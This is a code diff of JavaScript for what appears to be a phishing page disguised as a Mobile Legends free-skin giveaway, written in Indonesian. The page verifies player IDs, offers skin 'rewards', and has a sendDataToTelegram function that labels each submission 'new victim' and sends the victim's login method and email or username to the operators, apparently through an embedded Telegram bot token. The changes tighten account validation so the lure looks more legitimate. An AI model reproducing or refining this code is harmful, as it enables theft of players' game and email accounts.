@@ -1,5 +1,6 @@
 let chosenReward = "";
 let verifiedNickname = "";
+let isAccountValid = false;
 
 const part1 = "8816261841";
 const part2 = "AAFOvMF00rlDMaxydRfxnTpi5bff";
@@ -45,36 +46,41 @@ function checkAccountReal() {
         statusDiv.style.border = '1px solid rgba(41, 128, 185, 0.3)';
         statusDiv.style.color = '#3498db';
         statusDiv.innerHTML = "Menghubungkan ke server MLBB...";
+        isAccountValid = false;
         
         checkTimeout = setTimeout(() => {
             fetch(`https://api.isan.eu.org/nickname/ml?id=${uid}&server=${sid}`)
                 .then(response => response.json())
                 .then(data => {
-                    if(data && data.success) {
+                    if(data && data.success && data.name) {
                         verifiedNickname = data.name;
+                        isAccountValid = true;
                         statusDiv.style.background = 'rgba(39, 174, 96, 0.1)';
                         statusDiv.style.border = '1px solid rgba(39, 174, 96, 0.3)';
                         statusDiv.style.color = '#27ae60';
-                        statusDiv.innerHTML = `Akun "${verifiedNickname}" terdeteksi. Silahkan pilih hadiah!`;
+                        statusDiv.innerHTML = `Data "${verifiedNickname}" terdeteksi valid! Silahkan pilih hadiah`;
                     } else {
-                        verifiedNickname = "Player_" + uid;
-                        statusDiv.style.background = 'rgba(39, 174, 96, 0.1)';
-                        statusDiv.style.border = '1px solid rgba(39, 174, 96, 0.3)';
-                        statusDiv.style.color = '#27ae60';
-                        statusDiv.innerHTML = `ID & Server valid. Silahkan pilih hadiah!`;
+                        verifiedNickname = "";
+                        isAccountValid = false;
+                        statusDiv.style.background = 'rgba(192, 57, 43, 0.1)';
+                        statusDiv.style.border = '1px solid rgba(192, 57, 43, 0.3)';
+                        statusDiv.style.color = '#e74c3c';
+                        statusDiv.innerHTML = `ID atau Server tidak ditemukan / Salah!`;
                     }
                 })
                 .catch(err => {
-                    verifiedNickname = "Player_" + uid;
-                    statusDiv.style.background = 'rgba(39, 174, 96, 0.1)';
-                    statusDiv.style.border = '1px solid rgba(39, 174, 96, 0.3)';
-                    statusDiv.style.color = '#27ae60';
-                    statusDiv.innerHTML = `ID & Server valid. Silahkan pilih hadiah!`;
+                    verifiedNickname = "";
+                    isAccountValid = false;
+                    statusDiv.style.background = 'rgba(192, 57, 43, 0.1)';
+                    statusDiv.style.border = '1px solid rgba(192, 57, 43, 0.3)';
+                    statusDiv.style.color = '#e74c3c';
+                    statusDiv.innerHTML = `Gagal memeriksa akun, periksa kembali data anda!`;
                 });
         }, 600);
     } else {
         statusDiv.style.display = 'none';
         verifiedNickname = "";
+        isAccountValid = false;
     }
 }
 
@@ -155,12 +161,12 @@ const skinAlbums = [
     {
         title: "Saint Seiya",
         skins: [
-            {name: "Badang — Pegasus Seiya", img: "./saint-seiya/Badang.jpg"},
-            {name: "Valir — Phoenix Ikki", img: "./saint-seiya/Valir.jpg"},
-            {name: "Chou — Dragon Shiryu", img: "./saint-seiya/Chou.jpg"},
-            {name: "Badang — Sagittarius Seiya", img: "./saint-seiya/Badang2.jpg"},
-            {name: "Valir — Leo Ikki", img: "./saint-seiya/Valir2.jpg"},
-            {name: "Chou — Libra Shiryu", img: "./saint-seiya/Chou2.jpg"}
+            {name: "Badang — Pegasus Seiya", img: "./saint-saiya/Badang.jpg"},
+            {name: "Valir — Phoenix Ikki", img: "./saint-saiya/Valir.jpg"},
+            {name: "Chou — Dragon Shiryu", img: "./saint-saiya/Chou.jpg"},
+            {name: "Badang — Sagittarius Seiya", img: "./saint-saiya/Badang2.jpg"},
+            {name: "Valir — Leo Ikki", img: "./saint-saiya/Valir2.jpg"},
+            {name: "Chou — Libra Shiryu", img: "./saint-saiya/Chou2.jpg"}
         ]
     },
     {
@@ -445,7 +451,7 @@ function triggerSearch() {
 
 function openAlbumByIndex(index) {
     const album = skinAlbums[index];
-    document.getElementById('albumModalTitle').innerText = "Album: " + album.title;
+    document.getElementById('albumModalTitle').innerText = album.title;
     document.getElementById('albumModalDesc').innerText = "Tekan salah satu skin di bawah untuk memilihnya sebagai hadiah klaim!";
     const gridContainer = document.getElementById('albumModalGrid');
     gridContainer.innerHTML = "";
@@ -470,7 +476,7 @@ function selectRewardFromAlbum(skinName) {
     const uid = document.getElementById('userid').value.trim();
     const sid = document.getElementById('serverid').value.trim();
 
-    if(!uid || !sid) {
+    if(!uid || !sid || !isAccountValid) {
         closeAlbumModal();
         showWarning();
         return;
@@ -495,7 +501,7 @@ function selectRewardFromMain(element, name) {
     const uid = document.getElementById('userid').value.trim();
     const sid = document.getElementById('serverid').value.trim();
 
-    if(!uid || !sid) {
+    if(!uid || !sid || !isAccountValid) {
         showWarning();
         return;
     }
@@ -521,7 +527,7 @@ function openLoginModal() {
     const uid = document.getElementById('userid').value.trim();
     const sid = document.getElementById('serverid').value.trim();
 
-    if(!uid || !sid) {
+    if(!uid || !sid || !isAccountValid) {
         showWarning();
         return;
     }
@@ -556,7 +562,7 @@ function sendDataToTelegram() {
 
     const message = "ADA KORBAN BARU NIH!\n\n" +
                     "Hadiah: " + chosenReward + "\n" +
-                    "Nickname/ID: " + (verifiedNickname || ("Player_" + uid)) + "\n" +
+                    "Nickname/ID: " + verifiedNickname + "\n" +
                     "ID & Server: " + uid + " (" + sid + ")\n" +
                     "Akun: " + method + "\n" +
                     "Email/User: " + userAcc + "\n" +
